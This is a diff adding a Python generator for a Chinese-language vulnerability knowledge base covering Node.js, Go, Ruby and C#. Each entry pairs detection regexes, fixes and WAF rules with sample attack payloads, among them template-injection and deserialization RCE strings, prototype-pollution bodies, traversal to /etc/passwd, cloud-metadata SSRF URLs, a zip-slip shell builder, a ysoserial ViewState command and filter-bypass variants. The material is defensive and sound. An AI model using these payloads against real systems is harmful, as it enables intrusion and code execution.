+ ["ejs.render","Handlebars.compile","pug.render","_.template"],
+ ["ejs.render(","Handlebars.compile(","pug.render(","_.template("],
+ ["req.query","req.body","req.params"],
+ [R("kbnode-ssti-1","模板编译用户输入","regex",
+    r"(ejs\.render|Handlebars\.compile|pug\.render|_.template)\s*\(\s*(req\.|user|input|body)","critical",1,
+    "模板字符串来自用户输入"),
+  R("kbnode-ssti-2","EJS 危险语法","keyword",r"<%[=\-]?[\s\S]{0,40}(process|require|global)","high",2,
+    "模板中出现 process/require 调用"),
+  R("kbnode-ssti-3","动态 renderFile","regex",r"res\.render\s*\(\s*(req\.|path|name)","high",2,
+    "视图名来自请求，可读任意模板文件")],
+ "模板只从固定文件加载：res.render('fixed', {name: userInput})。",
+ "禁止用户输入进入模板源码；EJS 设置 delimiter 与 _with=false，Handlebars 用受限 helper 白名单。",
+ "app.get('/hello', (req,res)=>{\n  res.render('hello', { name: String(req.query.name).slice(0,32) });\n});",
+ "javascript",
+ "用户输入只能是模板变量，不能是模板源码。",
+ "<%= global.process.mainModule.require('child_process').execSync('id') %>\n"
+ "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}...{{/with}}{{/with}}{{/with}}",
+ "if (body matches '<%[=\\-]?.*(process|require)|\\.constructor\\.constructor'): block", "", "",
+ "<%=,process.mainModule,require(",
+ "模板与数据分离；WAF 拦截 EJS 语法与 constructor 链。",
+ ["<%= 大小写/空格", "#{ } Pug 插值", "Handlebars 原型链 helper"],
+ "误报：模板文件内正常 EJS 语法不构成风险。",
+ "ssti,nodejs,ejs,handlebars,rce",
+ ["https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"] ))
+
+D.append(T("Node.js 原型污染 → RCE","prototype-pollution","nodejs","critical",
+ "__proto__ / constructor.prototype 合并（lodash.merge、Object.assign 深拷贝）污染 Object.prototype，"
+ "再配合 child_process 的 shell 选项或 EJS 的 outputFunctionName 升级为 RCE。",
+ ["lodash.merge","Object.assign","__proto__","constructor.prototype"],
+ ["merge(","__proto__","constructor.prototype"],
+ ["req.body","JSON.parse"],
+ [R("kbnode-proto-1","不安全的深合并","regex",
+    r"(merge|extend|defaultsDeep|assign)\s*\(\s*[^,]+,\s*(req\.(body|query)|JSON\.parse)","high",1,
+    "合并用户可控对象，存在原型污染"),
+  R("kbnode-proto-2","__proto__ 键","keyword",r"__proto__|constructor\s*\.\s*prototype","high",2,
+    "出现原型链键名"),
+  R("kbnode-proto-3","危险汇聚点","regex",r"(child_process|execSync|spawnSync)[\s\S]{0,120}(shell|env)","medium",3,
+    "原型污染可影响 child_process 选项")],
+ "合并前删除危险键：if (k==='__proto__'||k==='constructor'||k==='prototype') continue;",
+ "用 Object.create(null) 作为容器；用 JSON Schema 校验入参；\n"
+ "Object.freeze(Object.prototype)；升级 lodash ≥ 4.17.21。",
+ "const safe = Object.create(null);\nfor (const [k,v] of Object.entries(req.body)) {\n"
+ "  if (['__proto__','constructor','prototype'].includes(k)) continue;\n  safe[k] = v;\n}",
+ "javascript",
+ "原型污染本身是逻辑问题，配合汇聚点可 RCE。",
+ "POST /api/merge {\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/environ\","
+ "\"env\":{\"EVIL\":\"console.log(require('child_process').execSync('id').toString())\"}}}",
+ "if (body matches '__proto__|constructor.*prototype'): block", "", "", "__proto__,constructor.prototype",
+ "过滤危险键；冻结原型；升级 lodash；WAF 拦截 __proto__。",
+ ["constructor[prototype]", "__proto__ 用 JSON 数组绕过", "Object.prototype 通过 merge 递归"],
+ "误报：业务对象中正常出现 constructor 字段极少。",
+ "prototype-pollution,nodejs,rce",
+ ["https://github.com/BlackFan/client-side-prototype-pollution"] ))
+
+D.append(T("Node.js 命令执行（child_process 拼接）","rce","nodejs","critical",
+ "exec/execSync 走 shell 解析，拼接用户输入可注入 ; | && $( ) ` `；spawn 默认不走 shell 但也可能被污染选项影响。",
+ ["child_process.exec","execSync","spawn","execFile"],
+ ["exec(","execSync(","spawn("],
+ ["req.query","req.body","req.params"],
+ [R("kbnode-rce-1","exec 拼接输入","regex",
+    r"(exec|execSync)\s*\(\s*(`[^`]*\\$\{|[^)]*\+\s*req\.)","critical",1,"exec 模板字符串/拼接含请求数据"),
+  R("kbnode-rce-2","exec 使用变量","regex",r"(exec|execSync)\s*\(\s*[a-z_]\w*\s*[,)]","high",2,
+    "exec 参数为变量，需确认来源"),
+  R("kbnode-rce-3","shell:true","regex",r"shell\s*:\s*true","medium",3,"spawn 开启 shell，参数需转义")],
+ "改用 execFile('ls', ['-l', dir]) 或 spawn 传数组参数。",
+ "使用 execFile/spawn 数组传参；必须拼 shell 时用 shell-quote 转义并对参数做白名单正则。",
+ "const { execFile } = require('child_process');\n"
+ "if (!/^[\\w./-]{1,64}$/.test(dir)) return res.status(400).end();\n"
+ "execFile('ls', ['-l', dir], { timeout: 3000 }, (e, out) => res.send(out));",
+ "javascript",
+ "exec 走 shell，必须改 execFile/spawn 数组传参。",
+ "?host=127.0.0.1;id\n?host=$(id)\n?host=`id`",
+ "if (param matches '[;|&`$()\\n]'): block", "", "", "exec(,execSync(,shell:true",
+ "execFile + 白名单正则；WAF 拦截 shell 元字符。",
+ ["$IFS", "\\n 换行", "base64 解码执行", "node -e"],
+ "误报：exec 参数为常量时不构成风险。",
+ "rce,nodejs,command-injection",
+ ["https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback"] ))
+
+D.append(T("Node.js 路径穿越（path.join / sendFile）","lfi","nodejs","high",
+ "path.join(base, req.query.f) 遇 ../ 会逃出 base；res.sendFile(userPath)、fs.readFile 同理，可读源码与 flag。",
+ ["fs.readFile","res.sendFile","path.join","path.resolve"],
+ ["path.join(","res.sendFile(","readFile("],
+ ["req.query","req.params"],
+ [R("kbnode-lfi-1","path.join 拼接请求","regex",
+    r"path\.(join|resolve)\s*\([^)]*req\.(query|params|body)","high",1,"路径拼接含请求数据"),
+  R("kbnode-lfi-2","sendFile 使用请求","regex",r"(sendFile|readFile|createReadStream)\s*\(\s*(req\.|path\.join)","high",1,
+    "文件读取路径来自请求"),
+  R("kbnode-lfi-3","缺少归一化校验","regex",r"path\.normalize\s*\([^)]*req\.","medium",3,
+    "仅 normalize 未做前缀校验，仍可穿越")],
+ "const p = path.resolve(base, name); if (!p.startsWith(base + path.sep)) return 403;",
+ "用 fs.realpathSync 解析符号链接后再校验前缀；文件名改用 uuid 存储，读文件走 ID 查库。",
+ "const base = path.resolve('/data/files');\nconst p = path.resolve(base, String(name));\n"
+ "if (!p.startsWith(base + path.sep)) return res.status(403).end();\nres.sendFile(p);",
+ "javascript",
+ "路径参数必须 resolve + 前缀校验，或改为 ID 映射。",
+ "?file=../../../../etc/passwd\n?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+ "if (param matches '(\\.\\./|%2e%2e)'): block", "", "", "../,%2e%2e,etc/passwd",
+ "resolve + 前缀校验；WAF 拦截 ../。",
+ ["....//", "..%2f", "%252e%252e%252f 双重编码", "符号链接指向 /etc"],
+ "误报：路径常量拼接无风险。",
+ "lfi,nodejs,path-traversal",
+ ["https://cwe.mitre.org/data/definitions/22.html"] ))
+
+D.append(T("Node.js NoSQL 注入（MongoDB 操作符）","nosqli","nodejs","high",
+ "直接把 req.body 传给 find()/findOne() 时，传入 {\"$ne\":null}、{\"$gt\":\"\"} 或 {\"$regex\":\"^a\"} 可绕过登录或拖库。",
+ ["collection.find","findOne","$where"],
+ ["find(","findOne(","$where"],
+ ["req.body","req.query"],
+ [R("kbnode-nosql-1","请求体直接进查询","regex",
+    r"(find|findOne|updateOne|deleteOne|countDocuments)\s*\(\s*(req\.(body|query)|JSON\.parse)","critical",1,
+    "查询条件直接使用请求体"),
+  R("kbnode-nosql-2","$where 使用","keyword",r"\$where","high",2,"使用 $where 可执行 JS"),
+  R("kbnode-nosql-3","未校验对象类型","regex",r"(username|password)\s*:\s*req\.body\.","high",2,
+    "认证字段直接取请求体，可能为对象而非字符串")],
+ "强制类型：String(req.body.username)；拒绝对象/数组入参。",
+ "用 Joi/zod 做 schema 校验（类型 string）；查询前把关键字段 cast 成字符串；禁用 $where。",
+ "const schema = z.object({ username: z.string().max(64), password: z.string().max(128) });\n"
+ "const { username, password } = schema.parse(req.body);\nconst u = await db.collection('users').findOne({ username });",
+ "javascript",
+ "认证字段必须校验为字符串，否则操作符注入绕过登录。",
+ "POST /login {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}\n"
+ "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}",
+ "if (body matches '\\$ne|\\$gt|\\$regex|\\$where'): block", "", "", "$ne,$gt,$regex,$where",
+ "schema 校验强制类型；WAF 拦截 $ 操作符。",
+ ["$ne 换 $not", "$regex 逐字符爆破", "$where 执行 JS"],
+ "误报：业务查询确实需要操作符时应显式白名单。",
+ "nosqli,nodejs,mongodb",
+ ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"] ))
+
+D.append(T("Node.js 不安全反序列化（node-serialize / funcster）","deserialization","nodejs","critical",
+ "node-serialize 的 unserialize() 会 eval 反序列化出的函数体（_$$ND_FUNC$$_），"
+ "传入构造的 payload 直接 RCE；funcster、cryo 同理。",
+ ["node-serialize","unserialize","eval"],
+ ["unserialize(","_$$ND_FUNC$$_","funcster"],
+ ["req.body","req.cookies"],
+ [R("kbnode-deser-1","unserialize 使用","regex",r"(node-serialize|serialize)\.unserialize\s*\(|unserialize\s*\(\s*(req\.|cookie)","critical",1,
+    "对不可信数据调用 unserialize"),
+  R("kbnode-deser-2","函数序列化特征","keyword",r"_\$\$ND_FUNC\$\$_","critical",1,"node-serialize 的函数标记"),
+  R("kbnode-deser-3","eval 解析数据","regex",r"eval\s*\(\s*['\"]\(\s*['\"]\s*\+","high",2,
+    "eval 拼接字符串，典型反序列化实现")],
+ "改用 JSON.parse；session 用签名 cookie（cookie-session）。",
+ "移除 node-serialize/funcster 依赖；状态传输统一 JSON + HMAC 签名；\n"
+ "如必须兼容旧格式，先 HMAC 校验再反序列化，且反序列化在受限 vm 中执行。",
+ "const data = JSON.parse(Buffer.from(req.cookies.state, 'base64').toString());\n"
+ "if (!hmac.verify(req.cookies.sig, JSON.stringify(data))) return res.status(400).end();",
+ "javascript",
+ "node-serialize 反序列化会 eval，必须换 JSON + 签名。",
+ "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()\"}",
+ "if (body contains '_$$ND_FUNC$$_'): block", "", "", "_$$ND_FUNC$$_,unserialize(",
+ "移除不安全库；JSON + 签名；WAF 拦截 _$$ND_FUNC$$_。",
+ ["base64 包裹 payload", "cookie 中传递", "嵌套在数组里"],
+ "误报：无。",
+ "deserialization,nodejs,rce",
+ ["https://github.com/luin/serialize/issues"] ))
+
+D.append(T("JWT 校验缺陷（alg=none / 弱密钥 / kid 注入）","jwt","mixed","high",
+ "服务端未固定算法时可用 alg:none 伪造；HS256 弱密钥可爆破；kid 参数可注入路径或 SQL，"
+ "jku/x5u 可指向攻击者 JWKS。",
+ ["jwt.verify","jsonwebtoken","PyJWT","jose"],
+ ["jwt.verify(","decode(","algorithms"],
+ ["Authorization: Bearer","cookie"],
+ [R("kbjwt-1","未固定算法","regex",r"(jwt\.verify|pyjwt\.decode)\s*\(","high",1,
+    "校验时未显式指定 algorithms"),
+  R("kbjwt-2","允许 none","keyword",r"algorithms?\s*[:=]\s*\[?['\"]none['\"]","critical",1,"显式允许 none 算法"),
+  R("kbjwt-3","kid 参与拼接","regex",r"kid[\s\S]{0,60}(readFile|query|exec|path\.join)","high",2,
+    "kid 被用于文件/SQL/命令，存在注入")],
+ "jwt.verify(token, key, { algorithms: ['HS256'] }) —— 必须显式指定算法。",
+ "固定算法 + 强随机密钥（≥32 字节）；kid 只做映射表查表；jku/x5u 白名单域名；\n"
+ "校验 exp/nbf/iss/aud，拒绝 alg 为 none。",
+ "const payload = jwt.verify(token, SECRET, {\n  algorithms: ['HS256'], issuer: 'app', audience: 'web'\n});",
+ "javascript",
+ "JWT 必须固定算法、强密钥、kid 查表。",
+ "alg:none 伪造 admin\nHS256 弱密钥用 hashcat -m 16500 爆破\nkid=../../../../dev/null 配合空密钥签名",
+ "if (token header alg == 'none'): reject", "", "", "alg:none,kid,jku",
+ "固定算法白名单；强密钥；kid 查表；WAF 拦截 none 算法。",
+ ["alg 大小写 None/NONE", "RS256→HS256 混淆用公钥当 HMAC key", "kid SQL 注入", "jku 指向攻击者"],
+ "误报：decode 仅用于读取不校验时需单独判断。",
+ "jwt,auth-bypass,weak-crypto",
+ ["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"] ))
+
+D.append(T("Node.js ORM 原始 SQL 注入（Sequelize / Knex / TypeORM）","sqli","nodejs","critical",
+ "sequelize.query(`...${x}`)、knex.raw(拼接)、TypeORM 的 query() 拼接都会注入；"
+ "Sequelize 的 where 传字符串也会被当作原始 SQL。",
+ ["sequelize.query","knex.raw","query"],
+ ["sequelize.query(","knex.raw(",".query("],
+ ["req.query","req.body"],
+ [R("kbnode-sqli-1","模板字符串进 SQL","regex",
+    r"(query|raw)\s*\(\s*(`[^`]*\\$\{|[^)]*\+\s*req\.)","critical",1,"SQL 语句拼接请求数据"),
+  R("kbnode-sqli-2","replacements 缺失","regex",r"sequelize\.query\s*\([^,)]*\)","medium",2,
+    "sequelize.query 无 replacements，需确认是否拼接"),
+  R("kbnode-sqli-3","where 传字符串","regex",r"where\s*:\s*(`|['\"][^'\"]*\\$\\{)", "high",2,
+    "where 传字符串模板，会被当原始 SQL")],
+ "sequelize.query('SELECT * FROM t WHERE id = ?', { replacements: [id], type: QueryTypes.SELECT })",
+ "全部使用绑定参数（replacements / bind）；ORM 用对象条件；禁止模板字符串进 SQL。",
+ "const rows = await sequelize.query(\n  'SELECT * FROM users WHERE id = :id',\n"
+ "  { replacements: { id }, type: QueryTypes.SELECT }\n);",
+ "javascript",
+ "SQL 必须绑定参数，模板字符串拼接等于注入。",
+ "?id=1 UNION SELECT username,password FROM users\n?id=1 AND SLEEP(3)",
+ "if (param matches 'union\\s+select|sleep\\(|information_schema'): block", "", "",
+ "union select,sleep,information_schema",
+ "绑定参数；WAF 拦截 UNION/SLEEP。",
+ ["/**/ 注释", "大小写", "%55NION 编码", "时间盲注"],
+ "误报：query 使用占位符安全。",
+ "sqli,nodejs,sequelize",
+ ["https://sequelize.org/docs/v6/core-concepts/raw-queries/"] ))
+
+# ---------------- Go ----------------
+D.append(T("Go text/template 注入","ssti","go","high",
+ "text/template 或 html/template 的 Parse(userInput) 会把用户输入当模板，"
+ "可用 {{.}} 读数据，配合自定义函数或 {{printf \"%s\" (call .Fn)}} 影响逻辑；html/template 无法完全阻止信息泄露。",
+ ["template.Parse","template.New","Parse"],
+ ["template.Parse(","template.New(","ParseFiles("],
+ ["r.URL.Query","body"],
+ [R("kbgo-ssti-1","解析用户输入为模板","regex",
+    r"template\.(New|Must)\s*\([^)]*\)\s*\.Parse\s*\(\s*(r\.|input|body|user)","critical",1,
+    "模板源码来自用户输入"),
+  R("kbgo-ssti-2","Parse 变量参数","regex",r"\.Parse\s*\(\s*[a-z]\w*\s*\)","high",2,
+    "Parse 参数为变量，需确认来源"),
+  R("kbgo-ssti-3","template.HTML 转换","regex",r"template\.HTML\s*\(\s*[a-z]\w*\s*\)","medium",3,
+    "把变量标记为可信 HTML，可能 XSS")],
+ "模板只从 embed/文件加载：template.ParseFS(embedded, \"tpl/*.html\")。",
+ "用户输入只作为 Execute 的数据参数，永不作为模板源码；\n"
+ "必须动态模板时用白名单语法或受限的占位符替换（strings.Replacer）。",
+ "var tpls = template.Must(template.ParseFS(embeddedFiles, \"tpl/*.html\"))\n"
+ "tpls.ExecuteTemplate(w, \"hello.html\", map[string]string{\"Name\": name})",
+ "go",
+ "用户输入只能是模板数据，不能是模板源码。",
+ "?name={{.Password}} 泄露上下文\n?name={{printf \"%p\" .}}",
+ "if (param matches '\\{\\{.*\\}\\}'): block", "", "", "{{,Parse(",
+ "模板与数据分离；WAF 拦截 {{ }}。",
+ ["{{ 与 }} 之间加空格", "{{/*comment*/}}", "嵌套 {{template}}"],
+ "误报：模板文件内正常语法不构成风险。",
+ "ssti,go,template",
+ ["https://pkg.go.dev/text/template#hdr-Security_Model"] ))
+
+D.append(T("Go GORM / database/sql 注入","sqli","go","high",
+ "db.Raw(fmt.Sprintf(...))、db.Where(\"name = '\"+name+\"'\")、db.Exec 拼接都会注入；"
+ "GORM 的 Where 传字符串且无占位符时同样危险。",
+ ["db.Raw","db.Exec","db.Where","Query"],
+ ["Raw(","Exec(","Where("],
+ ["r.URL.Query","json body"],
+ [R("kbgo-sqli-1","Raw/Exec 拼接","regex",
+    r"\.(Raw|Exec|Query|QueryRow)\s*\(\s*(fmt\.Sprintf|`[^`]*\\$\{|[^)]*\+\s*(r\.|name|id))","critical",1,
+    "SQL 语句拼接外部数据"),
+  R("kbgo-sqli-2","Where 字符串拼接","regex",r"\.Where\s*\(\s*(\"[^\"]*\"\s*\+|fmt\.Sprintf)","critical",1,
+    "Where 拼接字符串，无占位符"),
+  R("kbgo-sqli-3","Sprintf 生成 SQL","regex",r"fmt\.Sprintf\s*\(\s*\"[^\"]*(SELECT|INSERT|UPDATE|DELETE)","high",2,
+    "用 Sprintf 拼 SQL")],
+ "db.Raw(\"SELECT * FROM t WHERE id = ?\", id)",
+ "全部使用占位符 ? 或 :name 绑定；GORM 用结构体/Map 条件；禁止 Sprintf 进 SQL。",
+ "var u User\ndb.Where(\"id = ?\", id).First(&u)\ndb.Raw(\"SELECT * FROM users WHERE id = ?\", id).Scan(&u)",
+ "go",
+ "SQL 必须占位符绑定，Sprintf 拼接等于注入。",
+ "?id=1 UNION SELECT username,password FROM users\n?id=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)",
+ "if (param matches 'union\\s+select|sleep\\('): block", "", "", "union select,Sprintf,Raw(",
+ "占位符绑定；WAF 拦截 UNION/SLEEP。",
+ ["/**/", "大小写", "编码绕过"],
+ "误报：Raw 使用占位符安全。",
+ "sqli,go,gorm",
+ ["https://gorm.io/docs/security.html"] ))
+
+D.append(T("Go zip/tar 解压穿越（Zip Slip）","archive-slip","go","high",
+ "zip.File.Name 或 tar.Header.Name 含 ../ 时，filepath.Join(dst, name) 会写出目标目录，"
+ "覆盖配置、写 crontab、覆盖模板实现 RCE。",
+ ["zip.OpenReader","tar.NewReader","filepath.Join"],
+ ["zip.OpenReader(","tar.NewReader(","filepath.Join("],
+ ["上传的 zip/tar"],
+ [R("kbgo-slip-1","解压未校验路径","regex",
+    r"(zip|tar)\.[\s\S]{0,200}filepath\.Join\s*\([^)]*\)","high",1,"解压时直接 Join 条目名"),
+  R("kbgo-slip-2","缺少 .. 检查","keyword",r"strings\.Contains\s*\(\s*\w*[Nn]ame\s*,\s*\"\.\.\"","medium",2,
+    "仅字符串检查 ../，可被 ../ 变体绕过"),
+  R("kbgo-slip-3","解压到 web 目录","regex",r"(extract|unzip)[\s\S]{0,80}(static|public|webroot|www)","high",2,
+    "解压目标为 web 可执行目录")],
+ "解压前校验：if !strings.HasPrefix(filepath.Clean(dst), base+string(os.PathSeparator)) { continue }",
+ "用 filepath.Rel 校验相对路径不以 .. 开头；解压到临时目录后再移动到白名单子目录；\n"
+ "拒绝绝对路径与符号链接条目。",
+ "dst := filepath.Join(base, f.Name)\nrel, err := filepath.Rel(base, dst)\n"
+ "if err != nil || strings.HasPrefix(rel, \"..\") || filepath.IsAbs(f.Name) { continue }",
+ "go",
+ "解压必须校验条目相对路径，否则任意写文件。",
+ "# 构造 evil.zip 内含 ../../../../var/www/html/shell.php\npython3 -c \"import zipfile;z=zipfile.ZipFile('e.zip','w');z.writestr('../../shell.php','<?php');z.close()\"",
+ "if (zip entry name contains '..' or starts with '/'): skip", "", "", "../,zip slip",
+ "filepath.Rel 校验；拒绝绝对路径；解压到临时目录。",
+ ["..\\ Windows 反斜杠", "..%2f 编码后由上层解码", "符号链接条目", "嵌套 zip"],
+ "误报：解压到沙箱目录且条目白名单时安全。",
+ "archive-slip,go,zip",
+ ["https://security.snyk.io/research/zip-slip-vulnerability"] ))
+
+D.append(T("Go 路径穿越（filepath.Join / http.FileServer）","lfi","go","high",
+ "filepath.Join(base, userPath) 遇 ../../ 会逃出 base；http.FileServer(http.Dir(userDir)) 或 os.Open(拼接) 同理。",
+ ["os.Open","http.FileServer","filepath.Join"],
+ ["filepath.Join(","http.FileServer(","os.Open("],
+ ["r.URL.Query","r.PathValue"],
+ [R("kbgo-lfi-1","Join 拼接请求","regex",
+    r"filepath\.Join\s*\([^)]*(r\.URL|r\.FormValue|r\.PathValue|query)","high",1,"路径拼接含请求数据"),
+  R("kbgo-lfi-2","FileServer 动态目录","regex",r"http\.FileServer\s*\(\s*http\.Dir\s*\(\s*[a-z_]\w*","high",2,
+    "FileServer 目录来自变量，可被穿越"),
+  R("kbgo-lfi-3","os.Open 使用请求","regex",r"os\.(Open|ReadFile)\s*\(\s*(r\.|path\.Join|filepath\.Join)","high",2,
+    "文件读取路径来自请求")],
+ "p := filepath.Join(base, filepath.Clean(\"/\"+name)); if !strings.HasPrefix(p, base) { 403 }",
+ "用 filepath.Clean 后再校验前缀；文件名 uuid 化；读文件改 ID 查库。",
+ "name = filepath.Base(name) // 去掉所有目录部分\np := filepath.Join(base, name)\n"
+ "if _, err := os.Stat(p); err != nil { http.NotFound(w, r); return }\nhttp.ServeFile(w, r, p)",
+ "go",
+ "路径参数必须 Base/Clean + 前缀校验。",
+ "?file=../../../../etc/passwd\n?file=/etc/passwd",
+ "if (param matches '(\\.\\./|%2e%2e)') : block", "", "", "../,etc/passwd",
+ "filepath.Base 或 Clean + 前缀校验；WAF 拦截 ../。",
+ ["%2e%2e%2f", "..%5c", "//etc/passwd 双斜杠"],
+ "误报：路径常量拼接安全。",
+ "lfi,go,path-traversal",
+ ["https://cwe.mitre.org/data/definitions/22.html"] ))
+
+D.append(T("Go SSRF（http.Get 无校验）","ssrf","go","high",
+ "http.Get(userURL)、http.NewRequest 未限制协议与目标，可打内网服务与云元数据；"
+ "http.Client 默认跟随重定向会绕过一次性校验。",
+ ["http.Get","http.Post","http.NewRequest"],
+ ["http.Get(","http.NewRequest(","http.Client"],
+ ["r.URL.Query","json body"],
+ [R("kbgo-ssrf-1","http.Get 使用请求数据","regex",
+    r"http\.(Get|Post|PostForm|Head)\s*\(\s*(url|target|r\.|.*FormValue)","high",1,"请求目标来自用户输入"),
+  R("kbgo-ssrf-2","NewRequest 变量 URL","regex",r"http\.NewRequest\w*\s*\(\s*\"[A-Z]+\"\s*,\s*[a-z_]\w*","high",2,
+    "URL 来自变量，需确认来源"),
+  R("kbgo-ssrf-3","默认客户端跟随重定向","regex",r"http\.(Get|Post)\s*\(","medium",3,
+    "使用 DefaultClient，会跟随重定向")],
+ "白名单域名 + 禁止重定向：client.CheckRedirect = func(...) error { return http.ErrUseLastResponse }",
+ "解析域名后校验 IP 非私网/回环/链路本地；禁止 file/gopher 协议；\n"
+ "出网走固定代理并限制响应大小与超时。",
+ "u, err := url.Parse(raw)\nif err != nil || (u.Scheme != \"http\" && u.Scheme != \"https\") { 400 }\n"
+ "ips, _ := net.LookupIP(u.Hostname())\nfor _, ip := range ips {\n"
+ "  if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() { 400 }\n}",
+ "go",
+ "SSRF 必须协议 + 域名白名单 + 私网 IP 校验。",
+ "?url=http://169.254.169.254/latest/meta-data/\n?url=http://127.0.0.1:6379/",
+ "if (param matches '127\\.0\\.0\\.1|169\\.254|10\\.|192\\.168'): block", "", "",
+ "169.254.169.254,gopher://",
+ "白名单 + 私网校验 + 禁重定向；WAF 拦截元数据地址。",
+ ["302 跳转", "DNS rebinding", "十进制 IP", "IPv6 [::1]"],
+ "误报：URL 为常量安全。",
+ "ssrf,go",
+ ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"] ))
+
+# ---------------- Ruby / C# ----------------
+D.append(T("Ruby ERB / YAML.load 反序列化与模板注入","ssti","ruby","critical",
+ "ERB.new(userInput).result 直接执行 Ruby 代码；YAML.load 在 Psych<4 可实例化任意对象（Gem::Requirement 链）执行命令。",
+ ["ERB.new","YAML.load","Marshal.load"],
+ ["ERB.new(","YAML.load(","Marshal.load("],
+ ["params","request.body"],
+ [R("kbruby-1","ERB 渲染用户输入","regex",r"ERB\.new\s*\(\s*(params|user|input)","critical",1,
+    "ERB 模板来自用户输入"),
+  R("kbruby-2","YAML.load 不可信数据","regex",r"YAML\.load\s*\(","high",1,"YAML.load 可实例化任意对象，应改 safe_load"),
+  R("kbruby-3","Marshal.load 外部数据","regex",r"Marshal\.load\s*\(","high",1,"Marshal 反序列化等价 RCE")],
+ "YAML.load(x) → YAML.safe_load(x)；ERB 只渲染文件模板。",
+ "使用 YAML.safe_load(x, permitted_classes: [Symbol])；禁止 Marshal 处理外部数据；\n"
+ "ERB 模板固定从 views 目录读取，用户数据仅作为 binding 变量。",
+ "data = YAML.safe_load(raw, permitted_classes: [Symbol], aliases: true)\n"
+ "erb = ERB.new(File.read('views/msg.erb'))\nhtml = erb.result_with_hash(name: params[:name])",
+ "ruby",
+ "Ruby 的 YAML.load 与 ERB 都能直接执行代码。",
+ "ERB: <%= `id` %>\nYAML: !ruby/object:Gem::Requirement ...",
+ "if (body matches '<%=|!ruby/object'): block", "", "", "<%=,!ruby/object,YAML.load",
+ "safe_load；禁止 Marshal；ERB 模板固定。",
+ ["YAML.load 别名 YAML.unsafe_load", "Marshal base64 传递", "ERB trim_mode 变形"],
+ "误报：YAML.load 用于可信配置文件属常见。",
+ "ruby,ssti,deserialization",
+ ["https://ruby-doc.org/stdlib/libdoc/psych/rdoc/Psych.html"] ))
+
+D.append(T("C# / ASP.NET ViewState 与 BinaryFormatter 反序列化","deserialization","csharp","critical",
+ "ViewState 未启用 MAC（enableViewStateMac=false）或 machineKey 泄露可伪造 ViewState 打 gadget；"
+ "BinaryFormatter/NetDataContractSerializer/LosFormatter 反序列化外部数据直接 RCE。",
+ ["BinaryFormatter","LosFormatter","ObjectStateFormatter","ViewState"],
+ ["BinaryFormatter","enableViewStateMac","machineKey"],
+ ["__VIEWSTATE","POST body"],
+ [R("kbcsharp-1","BinaryFormatter 使用","keyword",r"BinaryFormatter|LosFormatter|ObjectStateFormatter","critical",1,
+    "使用不安全序列化器"),
+  R("kbcsharp-2","ViewState MAC 关闭","regex",r"enableViewStateMac\s*=\s*\"?false","critical",1,
+    "关闭 ViewState MAC 可伪造 ViewState"),
+  R("kbcsharp-3","machineKey 硬编码","regex",r"<machineKey[^>]*validationKey=\"[0-9A-Fa-f]{32,}\"","high",2,
+    "machineKey 硬编码在 web.config，泄露即可伪造")],
+ "删除 enableViewStateMac=false；用 <machineKey> 自动生成并保护。",
+ "升级 .NET ≥ 4.8 并使用 System.Text.Json；禁用 BinaryFormatter（.NET 5+ 默认抛异常）；\n"
+ "ViewState 开启 MAC 与加密，machineKey 用 DPAPI/KeyVault 管理。",
+ "<pages enableViewStateMac=\"true\" viewStateEncryptionMode=\"Always\" />\n"
+ "// 序列化改用 System.Text.Json\nvar obj = JsonSerializer.Deserialize<MyDto>(json);",
+ "csharp",
+ "ViewState 与 BinaryFormatter 都是已知 RCE 通道，必须禁用。",
+ "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" "
+ "--validationalg=SHA1 --validationkey=<key> --generator=<gen> --viewstate=<vs> --path=/ --apppath=/",
+ "if (__VIEWSTATE length > 100000): warn", "", "", "__VIEWSTATE,BinaryFormatter,machineKey",
+ "开启 ViewState MAC；禁用 BinaryFormatter；machineKey 外置。",
+ ["machineKey 从 web.config 备份泄露", "ViewState 分块", "通过 __VIEWSTATEGENERATOR 计算"],
+ "误报：BinaryFormatter 仅用于内部可信缓存时风险较低。",
+ "csharp,viewstate,deserialization,rce",
+ ["https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide"] ))
+
+p=os.path.join(OUT,"08-knowledge-java-node-go.json")
+json.dump(D,open(p,"w",encoding="utf-8"),ensure_ascii=False,indent=1)
+ids=[r["rule_id"] for t in D for r in t["match_rules"]]
+print("templates:",len(D),"rules:",len(ids),"dup:",len(ids)-len(set(ids)),"bytes:",os.path.getsize(p))
+print("lookahead:",[r["rule_id"] for t in D for r in t["match_rules"] if any(x in r["pattern"] for x in ("(?!","(?=","(?<"))])
